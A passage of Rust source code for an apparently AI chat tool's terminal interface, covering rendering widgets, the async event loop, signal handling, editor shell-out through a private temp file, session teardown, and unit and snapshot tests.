            Some(prompt) => prompt.rows(area.width, area.height),
            None => u16::try_from(self.composer.lines().len())
                .unwrap_or(COMPOSER_MAX_ROWS)
                .clamp(COMPOSER_MIN_ROWS, COMPOSER_MAX_ROWS),
        }
    }

    /// One frame from state; `frame.area()` is the only size consulted.
    pub(crate) fn render(&mut self, frame: &mut Frame) {
        let area = frame.area();
        self.frame_area = Some(area);
        let [transcript, status, bottom, footer] = Layout::vertical([
            Constraint::Min(0),
            Constraint::Length(1),
            Constraint::Length(self.bottom_pane_rows(area)),
            Constraint::Length(1),
        ])
        .areas(area);

        let mut lines = Vec::new();
        for (i, cell) in self.cells.iter_mut().enumerate() {
            if i > 0 {
                lines.push(Line::default());
            }
            lines.extend(cell.lines(transcript.width, &mut self.renderer));
        }
        frame.render_widget(TranscriptView { lines }, transcript);

        frame.render_widget(StatusStrip(self.status_text()), status);

        self.question_area = match self.prompts.front() {
            Some(prompt) => {
                let [question, ..] = prompt.areas(bottom.intersection(area));
                frame.render_widget(PromptModal(prompt), bottom);
                Some(question)
            }
            None => {
                frame.render_widget(&self.composer, bottom);
                None
            }
        };

        frame.render_widget(
            FooterBar {
                left: self.footer.text(),
                right: render::styled_line(&self.usage),
            },
            footer,
        );
    }

    /// Records the draw; while a turn runs the elapsed-time row asks for
    /// its next tick here, after the scheduler has forgotten the frame
    /// that was just drawn.
    pub(crate) fn frame_drawn(&mut self) {
        self.frames.frame_drawn();
        if self.turn.is_some() {
            self.frames.schedule_frame_in(STATUS_TICK);
        }
    }
}

/// The transcript's bottom-most lines, auto-following new output.
struct TranscriptView {
    lines: Vec<Line<'static>>,
}

impl Widget for TranscriptView {
    fn render(self, area: Rect, buf: &mut Buffer) {
        let area = area.intersection(*buf.area());
        if area.is_empty() {
            return;
        }
        let skip = self.lines.len().saturating_sub(usize::from(area.height));
        let visible: Vec<Line<'static>> = self.lines.into_iter().skip(skip).collect();
        Paragraph::new(visible).render(area, buf);
    }
}

struct StatusStrip(Option<String>);

impl Widget for StatusStrip {
    fn render(self, area: Rect, buf: &mut Buffer) {
        let area = area.intersection(*buf.area());
        if area.is_empty() {
            return;
        }
        if let Some(text) = self.0 {
            Paragraph::new(Line::from(Span::styled(text, DIM))).render(area, buf);
        }
    }
}

struct FooterBar {
    left: String,
    right: Line<'static>,
}

impl Widget for FooterBar {
    fn render(self, area: Rect, buf: &mut Buffer) {
        let area = area.intersection(*buf.area());
        if area.is_empty() {
            return;
        }
        Paragraph::new(Line::from(Span::styled(self.left, DIM))).render(area, buf);
        if self.right.width() > 0 {
            Paragraph::new(self.right.patch_style(DIM))
                .right_aligned()
                .render(area, buf);
        }
    }
}

/// A prompt drawn where the composer was: question, origin, hint. A
/// question taller than its rows is cut with a marker counting the hidden
/// lines and a legend offering only Esc; the cap grows with the terminal,
/// so enlarging it shows them.
struct PromptModal<'a>(&'a PendingPrompt);

impl Widget for PromptModal<'_> {
    fn render(self, area: Rect, buf: &mut Buffer) {
        let area = area.intersection(*buf.area());
        if area.is_empty() {
            return;
        }
        let [question, middle, hint] = self.0.areas(area);
        let req = &self.0.req;
        let mut lines = self.0.question_lines(area.width);
        let visible = usize::from(question.height);
        let clipped = lines.len() > visible;
        if clipped && visible > 0 {
            let kept = visible - 1;
            let hidden = lines.len() - kept;
            lines.truncate(kept);
            lines.push(Line::from(Span::styled(
                format!("(+{hidden} more lines; enlarge the terminal)"),
                DIM,
            )));
        }
        Paragraph::new(lines).render(question, buf);
        match &self.0.field {
            Some(field) => field.render(middle, buf),
            None => {
                if let Some(tool) = &req.tool {
                    Paragraph::new(Line::from(Span::styled(format!("tool: {tool}"), DIM)))
                        .render(middle, buf);
                }
            }
        }
        Paragraph::new(self.0.hint_lines(area.width, clipped)).render(hint, buf);
    }
}

enum Task {
    Turn {
        handle: JoinHandle<(RequestContext, TurnOutcome)>,
        command: bool,
    },
    Exit(JoinHandle<(RequestContext, Result<()>, String)>),
}

enum Done {
    Turn(Result<(RequestContext, TurnOutcome), tokio::task::JoinError>),
    Exit(Result<(RequestContext, Result<()>, String), tokio::task::JoinError>),
}

async fn join(task: &mut Option<Task>) -> Done {
    match task.as_mut().expect("polled only while a task runs") {
        Task::Turn { handle, .. } => Done::Turn(handle.await),
        Task::Exit(handle) => Done::Exit(handle.await),
    }
}

#[cfg(unix)]
struct Termination {
    term: tokio::signal::unix::Signal,
    hup: tokio::signal::unix::Signal,
    /// Raw mode turns Ctrl+C into a key, so SIGINT here is always a
    /// `kill -INT` and gets the same orderly leave as SIGTERM.
    int: tokio::signal::unix::Signal,
}

#[cfg(unix)]
impl Termination {
    fn arm() -> std::io::Result<Self> {
        use tokio::signal::unix::{SignalKind, signal};
        Ok(Self {
            term: signal(SignalKind::terminate())?,
            hup: signal(SignalKind::hangup())?,
            int: signal(SignalKind::interrupt())?,
        })
    }

    async fn recv(&mut self) {
        tokio::select! {
            _ = self.term.recv() => {}
            _ = self.hup.recv() => {}
            _ = self.int.recv() => {}
        }
    }

    /// Forgets a SIGINT that landed while the terminal was released. The
    /// editor and coyote share the foreground process group, so a Ctrl+C
    /// meant for the editor also reaches coyote, where it would otherwise
    /// sit latched and end the session at the next select. SIGTERM and
    /// SIGHUP are addressed to coyote itself and stay latched, so a kill
    /// or a lost terminal during the shell-out still quits afterwards.
    fn discard_pending(&mut self) {
        use futures_util::FutureExt;
        while self.int.recv().now_or_never().flatten().is_some() {}
    }
}

#[cfg(not(unix))]
struct Termination;

#[cfg(not(unix))]
impl Termination {
    fn arm() -> std::io::Result<Self> {
        Ok(Self)
    }

    async fn recv(&mut self) {
        std::future::pending().await
    }

    fn discard_pending(&mut self) {}
}

enum Step {
    Input(Option<std::io::Result<crossterm::event::Event>>),
    Msg(Option<UiMsg>),
    Frame,
    /// Boxed: the context rides back inside the join result.
    Work(Box<Done>),
    Signal,
}

/// Why the loop stopped.
enum Leave {
    /// The teardown task ran on the alternate screen; its result and
    /// whatever it printed come along.
    Finished(Result<()>, String),
    /// A termination signal or a closed stdin: nobody is left to answer a
    /// prompt, so the teardown runs after the screen is restored, on the
    /// context the turn handed back (or never left). Boxed for its size.
    Abandoned(Box<RequestContext>),
    /// The same signal or EOF, but the work task did not hand the context
    /// back within the deadline and is still running.
    Outlived(Unfinished),
    /// A work task panicked and took the context with it. The late output
    /// the loop already fed to the app comes along: the panic message
    /// arrives that way, and the app is never drawn again.
    Lost(tokio::task::JoinError, Vec<String>),
}

/// The work task the UI gave up waiting for.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Unfinished {
    Turn,
    Exit,
}

impl Unfinished {
    fn describe(self) -> &'static str {
        match self {
            Self::Turn => "The running turn",
            Self::Exit => "The session teardown",
        }
    }
}

/// The handles the loop holds between steps. `app`, `screen` and `abort`
/// are borrowed because `run` still needs them for the teardown after the
/// loop returns; the rest live and die with the loop.
struct Shell<'a> {
    app: &'a mut App,
    screen: &'a mut Screen,
    stream: EventStream,
    termination: Termination,
    rx: UnboundedReceiver<UiMsg>,
    tx: UnboundedSender<UiMsg>,
    abort: &'a AbortSignal,
    auto_cancel: &'a AtomicBool,
}

/// Answers a question raised once nobody is left to see it; any other
/// message has no screen left to go to.
fn answer_unattended(msg: UiMsg) {
    if let UiMsg::Prompt { req, reply } = msg {
        let _ = reply.send(unattended_answer(&req));
    }
}

/// Waits up to `deadline` for a work task after the UI gave up, answering
/// every prompt it raises meanwhile so the asker never sits on the reply
/// until the deadline.
async fn join_unattended<T>(
    handle: JoinHandle<T>,
    rx: &mut UnboundedReceiver<UiMsg>,
    deadline: Duration,
) -> Join<T> {
    while let Ok(msg) = rx.try_recv() {
        answer_unattended(msg);
    }
    tokio::pin!(handle);
    let joined = tokio::time::timeout(deadline, async {
        loop {
            tokio::select! {
                joined = &mut handle => return joined,
                Some(msg) = rx.recv() => answer_unattended(msg),
            }
        }
    })
    .await;
    match joined {
        Ok(Ok(value)) => Join::Finished(value),
        Ok(Err(err)) => Join::Panicked(err),
        Err(_) => Join::TimedOut,
    }
}

/// How the wait on a work task ended.
enum Join<T> {
    Finished(T),
    /// The task panicked; its message went out through the late-output
    /// path, as it does for a panic the loop itself observes.
    Panicked(tokio::task::JoinError),
    /// The deadline passed with the task still running.
    TimedOut,
}

/// Writes to fd 1 after the screen is restored; a failed write (the
/// terminal is gone) is dropped rather than raised, unlike `print!`.
fn write_to_terminal(text: &str) {
    use std::io::Write;
    let mut out = std::io::stdout().lock();
    let _ = out.write_all(text.as_bytes());
    let _ = out.flush();
}

/// The stderr twin of `write_to_terminal`.
fn write_to_stderr(text: &str) {
    use std::io::Write;
    let mut err = std::io::stderr().lock();
    let _ = err.write_all(text.as_bytes());
    let _ = err.flush();
}

/// Ends the process once the UI gave up on a work task that never handed
/// the context back. The task runs on a blocking-pool thread, which
/// nothing can cancel, and the `Runtime` dropped at the end of `main`
/// waits for that thread: the user would be left with a restored, empty
/// terminal and a process that does not exit until the tool does.
/// `top_level_agent_finished` cannot run here because the context is
/// inside the abandoned task. The notice goes through the screen's own
/// descriptor because the task still has fds 1 and 2 captured. Exits 0,
/// the orderly-quit code.
fn exit_leaving_the_task_behind(screen: &mut Screen, unfinished: Unfinished) -> ! {
    let _ = screen.print_line(&format!(
        "{} did not stop within {} s; leaving it behind",
        unfinished.describe(),
        EXIT_CANCEL_WAIT.as_secs()
    ));
    std::process::exit(0)
}

/// Edits `text` in `editor` (resolved the way the REPL resolves its buffer
/// editor) through a private, freshly created temp file, so no other user
/// can pre-plant a file or symlink at the path.
/// Hands `text` to `editor` through a private temp file and returns what
/// came back. An editor that exits non-zero (or is killed) leaves the text
/// as it was; the temp file is removed on every path.
fn edit_in_editor(editor: &str, text: &str) -> std::io::Result<String> {
    let path = crate::utils::temp_file("-tui-", ".md");
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
    }
    let written = (|| {
        use std::io::Write;
        options.open(&path)?.write_all(text.as_bytes())
    })();
    if let Err(err) = written {
        let _ = std::fs::remove_file(&path);
        return Err(err);
    }
    let status = std::process::Command::new(editor).arg(&path).status();
    let edited = std::fs::read_to_string(&path);
    let _ = std::fs::remove_file(&path);
    if !status?.success() {
        return Ok(text.to_string());
    }
    Ok(edited?.trim_end_matches('\n').to_string())
}

/// Reads and drops whatever the terminal queued while it was released
/// (to an editor or a stopped job), including events still in flight
/// when control came back. Gives up after `TYPEAHEAD_LIMIT` events so a
/// stream that never goes quiet cannot hold the loop.
async fn flush_typeahead<S>(stream: &mut S)
where
    S: futures_util::Stream<Item = std::io::Result<crossterm::event::Event>> + Unpin,
{
    for _ in 0..TYPEAHEAD_LIMIT {
        let drained = tokio::time::timeout(TYPEAHEAD_GRACE, stream.next()).await;
        if !drained.is_ok_and(|event| event.is_some()) {
            break;
        }
    }
}

/// The UI needs the keyboard and the screen on a terminal; refused before
/// anything else is started on its behalf.
pub fn ensure_tty() -> Result<()> {
    if !std::io::stdin().is_terminal() || !std::io::stdout().is_terminal() {
        bail!("No TTY for TUI")
    }
    Ok(())
}

pub async fn run(mut ctx: RequestContext) -> Result<()> {
    ensure_tty()?;
    let _active = ActiveGuard::set();
    let (tx, rx) = unbounded_channel();
    let auto_cancel = Arc::new(AtomicBool::new(false));
    let sink = Arc::new(TuiSink::new(tx.clone()));
    ctx.ui = Arc::clone(&sink) as Arc<dyn crate::turn::UiSink>;
    ctx.prompter = Arc::new(TuiPrompter::new(tx.clone(), Arc::clone(&auto_cancel)));
    let _subscription = BusSubscription::new(sink as Arc<dyn EventSink>);
    let abort = create_abort_signal();
    let mut app = App::new(
        Arc::new(SystemClock),
        Arc::clone(&ctx.app.config),
        Arc::clone(&ctx.prompt_memory),
        FooterInfo::from_ctx(&ctx),
    )?;

    let mut screen = Screen::enter()?;
    // Armed only once the terminal is ours. Entering blocks on the
    // keyboard-enhancement probe, which spins on a tty whose master has
    // gone away; with the streams armed earlier the SIGHUP for that
    // hang-up would sit latched in tokio with nothing polling it, and the
    // process would be left at full CPU. Under the default disposition it
    // dies the ordinary way, and `Screen`'s Drop still restores the
    // terminal if arming fails.
    let termination = Termination::arm()?;
    #[cfg(debug_assertions)]
    if std::env::var(PANIC_AT_START_ENV).as_deref() == Ok("1") {
        panic!("{PANIC_AT_START_ENV} requested a panic after entering the alternate screen");
    }
    app.schedule_frame();
    let mut shell = Shell {
        app: &mut app,
        screen: &mut screen,
        stream: EventStream::new(),
        termination,
        rx,
        tx,
        abort: &abort,
        auto_cancel: &auto_cancel,
    };

    let leave = run_loop(&mut shell, ctx).await;
    let mut rx = shell.rx;
    // The event reader would otherwise keep swallowing keystrokes from
    // the cooked terminal while the teardown below prints and waits.
    drop(shell.stream);
    // Whatever ended the loop, no screen is left to ask on: a question
    // raised during the teardown below answers itself.
    auto_cancel.store(true, Ordering::SeqCst);

    if let Err(err) = screen.leave() {
        warn!("Failed to restore the terminal: {err}");
    }
    // What the exit printed goes to the restored terminal with its colours
    // but without anything that could move the cursor or change a mode.
    // A terminal that is already gone (EIO after a hang-up) must not turn
    // the write into a panic ahead of the hook drain below.
    let result = match leave {
        Leave::Finished(result, captured) => {
            write_to_terminal(&render::sanitize_ansi(&captured));
            result
        }
        // The exit work gets the same bounded, unattended wait the loop
        // gives it; a teardown that never returns ends the process the
        // way an outlived task does instead of hanging a bare terminal.
        Leave::Abandoned(ctx) => {
            match join_unattended(spawn_exit(*ctx, abort.clone()), &mut rx, EXIT_CANCEL_WAIT).await
            {
                Join::Finished((_, result, captured)) => {
                    write_to_terminal(&render::sanitize_ansi(&captured));
                    result
                }
                Join::Panicked(err) => Err(err.into()),
                Join::TimedOut => {
                    crate::hooks::drain_pending(EXIT_HOOK_DRAIN_TIMEOUT).await;
                    exit_leaving_the_task_behind(&mut screen, Unfinished::Exit)
                }
            }
        }
        Leave::Outlived(unfinished) => {
            crate::hooks::drain_pending(EXIT_HOOK_DRAIN_TIMEOUT).await;
            exit_leaving_the_task_behind(&mut screen, unfinished)
        }
        Leave::Lost(err, mut late) => {
            settle_late_notices(&mut rx, &mut late).await;
            for text in late {
                write_to_stderr(&format!("{}\n", render::plain_text(&text)));
            }
            Err(err.into())
        }
    };
    crate::hooks::drain_pending(EXIT_HOOK_DRAIN_TIMEOUT).await;
    result.map(|_| ())
}

/// Collects the notices a lost turn's capture is still forwarding. The
/// drain thread hands the pipe's contents over after the guard went
/// down, so the queue gets the same bounded quiet-gap settle a finished
/// turn's capture gets before it is read.
async fn settle_late_notices(rx: &mut UnboundedReceiver<UiMsg>, late: &mut Vec<String>) {
    let started = Instant::now();
    let mut last = started;
    loop {
        let now = Instant::now();
        if now.duration_since(last) >= redirect::QUIET_GAP
            || now.duration_since(started) >= redirect::SETTLE_LIMIT
        {
            return;
        }
        let wait = (last + redirect::QUIET_GAP).min(started + redirect::SETTLE_LIMIT) - now;
        match tokio::time::timeout(wait, rx.recv()).await {
            Ok(Some(UiMsg::Notice { text, .. })) => {
                late.push(text);
                last = Instant::now();
            }
            Ok(Some(_)) => last = Instant::now(),
            Ok(None) | Err(_) => return,
        }
    }
}

async fn run_loop(shell: &mut Shell<'_>, ctx: RequestContext) -> Leave {
    let Shell {
        app,
        screen,
        stream,
        termination,
        rx,
        tx,
        abort,
        auto_cancel,
    } = shell;
    let mut ctx = Some(ctx);
    let mut task: Option<Task> = None;
    let mut quit_requested = false;
    loop {
        let step = tokio::select! {
            event = stream.next() => Step::Input(event),
            msg = rx.recv() => Step::Msg(msg),
            _ = app.frames.next_frame() => Step::Frame,
            done = join(&mut task), if task.is_some() => Step::Work(Box::new(done)),
            _ = termination.recv() => Step::Signal,
        };
        match step {
            Step::Signal | Step::Input(None) | Step::Input(Some(Err(_))) => {
                // Nobody is left to answer: prompts not yet asked answer
                // themselves, the queued and in-flight ones are answered
                // here, and only then is the turn told to stop.
                auto_cancel.store(true, Ordering::SeqCst);
                app.begin_exit();
                app.abandon_prompts();
                return match task.take() {
                    Some(Task::Turn { handle, .. }) => {
                        abort.set_ctrlc();
                        match join_unattended(handle, rx, EXIT_CANCEL_WAIT).await {
                            Join::Finished((returned, _)) => Leave::Abandoned(Box::new(returned)),
                            Join::Panicked(err) => Leave::Lost(err, app.turn_late_output()),
                            Join::TimedOut => Leave::Outlived(Unfinished::Turn),
                        }
                    }
                    Some(Task::Exit(handle)) => {
                        match join_unattended(handle, rx, EXIT_CANCEL_WAIT).await {
                            Join::Finished((_, result, captured)) => {
                                Leave::Finished(result, captured)
                            }
                            Join::Panicked(err) => Leave::Lost(err, Vec::new()),
                            Join::TimedOut => Leave::Outlived(Unfinished::Exit),
                        }
                    }
                    None => Leave::Abandoned(Box::new(
                        ctx.take()
                            .expect("the context is in hand while no task runs"),
                    )),
                };
            }
            Step::Input(Some(Ok(event))) => {
                let command = app.handle_input(events::classify(event));
                match command {
                    Some(Command::Submit(line)) => {
                        if let Some(ctx) = ctx.take() {
                            abort.reset();
                            let command = is_command(&line, ctx.app.config.command_prefix);
                            app.begin_turn(&line, command);
                            task = Some(Task::Turn {
                                handle: spawn_turn(ctx, abort.clone(), line, tx.clone()),
                                command,
                            });
                        }
                    }
                    Some(Command::Interrupt) => abort.set_ctrlc(),
                    Some(Command::Quit) => {
                        quit_requested = true;
                        if task.is_some() {
                            abort.set_ctrlc();
                        }
                    }
                    Some(Command::Suspend) => {
                        #[cfg(unix)]
                        {
                            *stream = EventStream::new();
                            let released = screen.with_terminal_released(|| {
                                // SAFETY: raise takes a signal number and no pointers.
                                unsafe { libc::raise(libc::SIGTSTP) };
                            });
                            termination.discard_pending();
                            if let Err(err) = released {
                                warn!("Failed to re-enter the alternate screen: {err}");
                            }
                            flush_typeahead(stream).await;
                            app.schedule_frame();
                        }
                    }
                    Some(Command::OpenEditor) => {
                        let text = app.composer_text();
                        match app.config.editor() {
                            Ok(editor) => {
                                *stream = EventStream::new();
                                let edited = screen
                                    .with_terminal_released(|| edit_in_editor(&editor, &text));
                                termination.discard_pending();
                                match edited {
                                    Ok(Ok(edited)) => app.set_composer_text(&edited),
                                    Ok(Err(err)) => app.handle_msg(UiMsg::Notice {
                                        kind: NoticeKind::ToolWarning,
                                        text: format!("Editor failed: {err}"),
                                    }),
                                    Err(err) => {
                                        warn!("Failed to re-enter the alternate screen: {err}")
                                    }
                                }
                                flush_typeahead(stream).await;
                            }
                            Err(err) => app.handle_msg(UiMsg::Notice {
                                kind: NoticeKind::ToolWarning,
                                text: err.to_string(),
                            }),
                        }
                        app.schedule_frame();
                    }
                    Some(Command::Redraw) => {
                        if let Err(err) = screen.clear() {
                            warn!("Failed to clear the screen: {err}");
                        }
                        app.schedule_frame();
                    }
                    None => {}
                }
            }
            Step::Msg(Some(msg)) => app.handle_msg(msg),
            Step::Msg(None) => {}
            Step::Frame => {
                if let Err(err) = screen.draw(|frame| app.render(frame)) {
                    warn!("Failed to draw a frame: {err}");
                }
                app.frame_drawn();
            }
            Step::Work(done) => match *done {
                Done::Turn(joined) => {
                    let Some(Task::Turn { command, .. }) = task.take() else {
                        continue;
                    };
                    match joined {
                        Ok((mut returned, outcome)) => {
                            app.end_turn(command, &outcome);
                            app.sync_from_ctx(&mut returned);
                            if outcome.exit {
                                quit_requested = true;
                            }
                            ctx = Some(returned);
                        }
                        Err(err) => {
                            let late = app.turn_late_output();
                            app.abandon_prompts();
                            return Leave::Lost(err, late);
                        }
                    }
                }
                Done::Exit(joined) => {
                    app.abandon_prompts();
                    return match joined {
                        Ok((_, result, captured)) => Leave::Finished(result, captured),
                        Err(err) => Leave::Lost(err, Vec::new()),
                    };
                }
            },
        }
        if quit_requested
            && task.is_none()
            && let Some(ctx) = ctx.take()
        {
            app.begin_exit();
            task = Some(Task::Exit(spawn_exit(ctx, abort.clone())));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::client::{ClientConfig, Model};
    use crate::config::{AppState, Session, SessionScope, WorkingMode};
    use crate::events::{Event, Origin};
    use crate::prompt::Prompter;
    use crate::testing::TestConfigDirGuard;
    use crossterm::event::{KeyCode, KeyModifiers};
    use events::ManualClock;
    use ratatui::Terminal;
    use ratatui::backend::TestBackend;
    use serial_test::serial;
    use std::future::Future;

    fn plain_config() -> Arc<AppConfig> {
        Arc::new(AppConfig {
            highlight: false,
            ..Default::default()
        })
    }

    fn chat_ctx() -> RequestContext {
        let mut app = AppState::test_default();
        app.config = Arc::new(AppConfig {
            dry_run: true,
            highlight: false,
            clients: vec![ClientConfig::default()],
            memory: Some(false),
            workspace_instructions: Some(false),
            stream: true,
            ..Default::default()
        });
        let mut ctx = RequestContext::new(Arc::new(app), WorkingMode::Repl);
        ctx.model = Model::new("openai", "test-model");
        ctx
    }

    struct Harness {
        clock: Arc<ManualClock>,
        app: App,
        terminal: Terminal<TestBackend>,
    }

    impl Harness {
        fn new(width: u16, height: u16, config: Arc<AppConfig>, footer: FooterInfo) -> Self {
            let clock = Arc::new(ManualClock::new());
            let app = App::new(
                Arc::clone(&clock) as Arc<dyn Clock>,
                config,
                Arc::new(PromptMemory::default()),
                footer,
            )
            .unwrap();
            let terminal = Terminal::new(TestBackend::new(width, height)).unwrap();
            Self {
                clock,
                app,
                terminal,
            }
        }

        fn standalone(width: u16, height: u16) -> Self {
            let footer = FooterInfo {
                model: "openai:test-model".to_string(),
                ..FooterInfo::default()
            };
            Self::new(width, height, plain_config(), footer)
        }

        fn for_ctx(ctx: &RequestContext) -> Self {
            Self::new(
                80,
                24,
                Arc::clone(&ctx.app.config),
                FooterInfo::from_ctx(ctx),
            )
        }

        fn render(&mut self) {
            self.terminal.draw(|frame| self.app.render(frame)).unwrap();
        }

        /// `TestBackend` cannot print a zero-width buffer, so the tiny
        /// screens go through `render` instead.
        fn draw(&mut self) -> String {
            self.render();
            self.terminal.backend().to_string()
        }

        fn resize(&mut self, width: u16, height: u16) {
            self.terminal.backend_mut().resize(width, height);
            self.app.handle_input(TermInput::Resize);
        }

        fn press(&mut self, code: KeyCode) -> Option<Command> {
            self.app.handle_key(KeyEvent::new(code, KeyModifiers::NONE))
        }

        fn type_text(&mut self, text: &str) {
            for c in text.chars() {
                self.press(KeyCode::Char(c));
            }
        }
    }

    /// Seats the UI's sink and prompter on `ctx` the way `run` does and
    /// hands back the loop's inbox.
    fn seat_tui(ctx: &mut RequestContext) -> (UnboundedSender<UiMsg>, UnboundedReceiver<UiMsg>) {
        let (tx, rx) = unbounded_channel();
        ctx.ui = Arc::new(TuiSink::new(tx.clone()));
        ctx.prompter = Arc::new(TuiPrompter::new(
            tx.clone(),
            Arc::new(AtomicBool::new(false)),
        ));
        (tx, rx)
    }

    fn confirm_request(tool: Option<&str>) -> PromptRequest {
        PromptRequest {
            tool: tool.map(str::to_string),
            ..PromptRequest::new(
                PromptAction::Confirm,
                "Proceed? tui-x7x",
                Origin::detached(),
            )
        }
    }

    /// Asks through the prompter on its own thread, the way a tool would,
    /// and delivers the request to the app.
    fn ask_on_a_thread(
        harness: &mut Harness,
        req: PromptRequest,
    ) -> std::thread::JoinHandle<Result<PromptAnswer>> {
        let (tx, mut rx) = unbounded_channel();
        let prompter = TuiPrompter::new(tx, Arc::new(AtomicBool::new(false)));
        let asker = std::thread::spawn(move || prompter.prompt(req));
        let msg = rx.blocking_recv().expect("the prompter sends the request");
        harness.app.handle_msg(msg);
        asker
    }

    fn duplicated_adjacent_rows(rendered: &str) -> usize {
        let rows: Vec<&str> = rendered
            .lines()
            .map(str::trim_end)
            .filter(|row| !row.trim_matches(['"', ' ']).is_empty())
            .collect();
        rows.windows(2).filter(|pair| pair[0] == pair[1]).count()
    }

    /// Drives a turn on a runtime whose workers have the stack headroom
    /// `run_repl_command` needs in debug builds; a default 2 MiB worker
    /// overflows and aborts the whole test binary.
    fn run_async<F>(f: F) -> F::Output
    where
        F: Future + Send,
        F::Output: Send,
    {
        const STACK: usize = 8 * 1024 * 1024;
        std::thread::scope(|scope| {
            std::thread::Builder::new()
                .stack_size(STACK)
                .spawn_scoped(scope, || {
                    tokio::runtime::Builder::new_multi_thread()
                        .worker_threads(2)
                        .thread_stack_size(STACK)
                        .enable_all()
                        .build()
                        .unwrap()
                        .block_on(f)
                })
                .unwrap()
                .join()
                .unwrap()
        })
    }

    /// Tool output that never breaks its line keeps only its newest
    /// text, the same bound the late-output cell has.
    #[test]
    fn a_newline_free_tool_stream_keeps_a_bounded_tail() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("explain", false);
        harness
            .app
            .append_tool_output(Some("c1".to_string()), b"head-m3z-");
        harness.app.append_tool_output(
            Some("c1".to_string()),
            "y".repeat(LATE_OUTPUT_LIMIT).as_bytes(),
        );
        harness
            .app
            .append_tool_output(Some("c1".to_string()), "tail-m3z".as_bytes());
        let Some(Cell::Text { lines, .. }) = harness.app.cells.last() else {
            panic!("the tool output did not land in a text cell");
        };
        assert_eq!(lines.len(), 1);
        assert_eq!(lines[0].len(), LATE_OUTPUT_LIMIT);
        assert!(
            lines[0].ends_with("tail-m3z"),
            "the newest text was dropped"
        );
        assert!(!lines[0].contains("head-m3z"), "the oldest text was kept");
    }

    #[test]
    fn text_deltas_grow_the_live_reply_in_place() {
        let mut harness = Harness::standalone(80, 24);
        harness
            .app
            .handle_msg(UiMsg::UsageUpdated("\x1b[36m[low] \x1b[0m".to_string()));
        harness.app.begin_turn("tell me a story", false);
        for (i, delta) in [
            "Once upon a **time**",
            " there was a paragraph.\n\nThen a second one,",
            " still arriving.",
        ]
        .into_iter()
        .enumerate()
        {
            harness.app.handle_msg(UiMsg::TextDelta(delta.to_string()));
            let rendered = harness.draw();
            insta::assert_snapshot!(format!("text_delta_{}", i + 1), rendered);
        }
        assert_eq!(harness.app.cells.len(), 2);
        assert!(matches!(
            &harness.app.cells[1],
            Cell::Assistant { source, done: false, .. }
                if source.ends_with("second one, still arriving.")
        ));
        harness.app.handle_msg(UiMsg::StreamDone);
        assert!(matches!(
            &harness.app.cells[1],
            Cell::Assistant { done: true, .. }
        ));
    }

    /// The harness reports from other test threads land in the fd capture
    /// too, so the captured text is dropped before the final frame.
    #[test]
    #[serial]
    fn a_dry_run_turn_streams_into_the_transcript() {
        run_async(async {
            let _guard = TestConfigDirGuard::new("tui-stream");
            let mut ctx = chat_ctx();
            let (tx, mut rx) = seat_tui(&mut ctx);
            let mut harness = Harness::for_ctx(&ctx);
            harness.app.begin_turn("hello", false);
            let mut handle = spawn_turn(ctx, create_abort_signal(), "hello".to_string(), tx);

            let mut first_delta = None;
            let (mut returned, outcome) = loop {
                tokio::select! {
                    biased;
                    Some(msg) = rx.recv() => {
                        let delta = matches!(msg, UiMsg::TextDelta(_));
                        harness.app.handle_msg(msg);
                        if delta {
                            let rendered = harness.draw();
                            if first_delta.is_none() {
                                first_delta = Some(rendered);
                            }
                        }
                    }
                    joined = &mut handle => break joined.unwrap(),
                }
            };
            while let Ok(msg) = rx.try_recv() {
                harness.app.handle_msg(msg);
            }
            let first_delta = first_delta.expect("the dry run streamed at least one delta");
            insta::assert_snapshot!("stream_first_delta", first_delta);

            assert!(!outcome.exit);
            assert_eq!(outcome.error, None);
            harness.app.end_turn(
                false,
                &TurnOutcome {
                    captured: String::new(),
                    ..outcome
                },
            );
            harness.app.sync_from_ctx(&mut returned);
            let final_frame = harness.draw();
            insta::assert_snapshot!("stream_final", final_frame.clone());
            // What tells the two frames apart: the status row shows the
            // running turn under the first delta and is empty once the
            // turn has ended.
            assert!(first_delta.contains("Working"), "{first_delta}");
            assert!(first_delta.contains("Esc to interrupt"), "{first_delta}");
            assert!(!final_frame.contains("Working"), "{final_frame}");
            assert!(!final_frame.contains("Esc to interrupt"), "{final_frame}");
            assert!(matches!(
                harness.app.cells.last(),
                Some(Cell::Assistant { source, done: true, .. }) if source.contains("hello")
            ));
        });
    }

    /// Under the test harness `print!` is diverted into libtest's own
    /// buffer before it reaches fd 1, so the command's text cannot be seen
    /// here; the pty test on the binary pins that. This pins the turn's
    /// shape: it runs the REPL command, ends clean and leaves one cell.
    #[test]
    #[serial]
    fn a_command_turn_becomes_one_preformatted_cell() {
        run_async(async {
            let _guard = TestConfigDirGuard::new("tui-info");
            let mut ctx = chat_ctx();
            let (tx, mut rx) = seat_tui(&mut ctx);
            let mut harness = Harness::for_ctx(&ctx);
            harness.app.begin_turn(".info", true);
            let (mut returned, outcome) =
                spawn_turn(ctx, create_abort_signal(), ".info".to_string(), tx)
                    .await
                    .unwrap();
            while let Ok(msg) = rx.try_recv() {
                harness.app.handle_msg(msg);
            }
            assert_eq!(outcome.error, None);
            harness.app.end_turn(true, &outcome);
            harness.app.sync_from_ctx(&mut returned);

            let commands: Vec<&Cell> = harness
                .app
                .cells
                .iter()
                .filter(|cell| matches!(cell, Cell::Command { .. }))
                .collect();
            assert_eq!(commands.len(), 1);
            let Cell::Command { name, .. } = commands[0] else {
                unreachable!()
            };
            assert_eq!(name, ".info");
            assert!(harness.app.turn.is_none());
            let rendered = harness.draw();
            assert!(rendered.contains("> .info"), "{rendered}");
        });
    }

    /// The `.info` listing reaches its cell as printed: label column,
    /// value column, model row first. (Under libtest the turn's `print!`
    /// never reaches the fd capture, so the listing is taken from the
    /// context directly; the pty case pins the capture on the binary.)
    #[test]
    #[serial]
    fn the_info_listing_keeps_its_rows_in_the_command_cell() {
        let _guard = TestConfigDirGuard::new("tui-info-rows");
        let ctx = chat_ctx();
        let info = ctx.info(&ctx.app.config).unwrap();
        let model_row = info
            .lines()
            .find(|row| row.starts_with("model "))
            .expect("the listing has a model row");
        assert!(model_row.contains("openai:test-model"), "{model_row:?}");

        // Tall enough to hold the whole listing, so no row scrolls off.
        let mut harness = Harness::new(
            100,
            80,
            Arc::clone(&ctx.app.config),
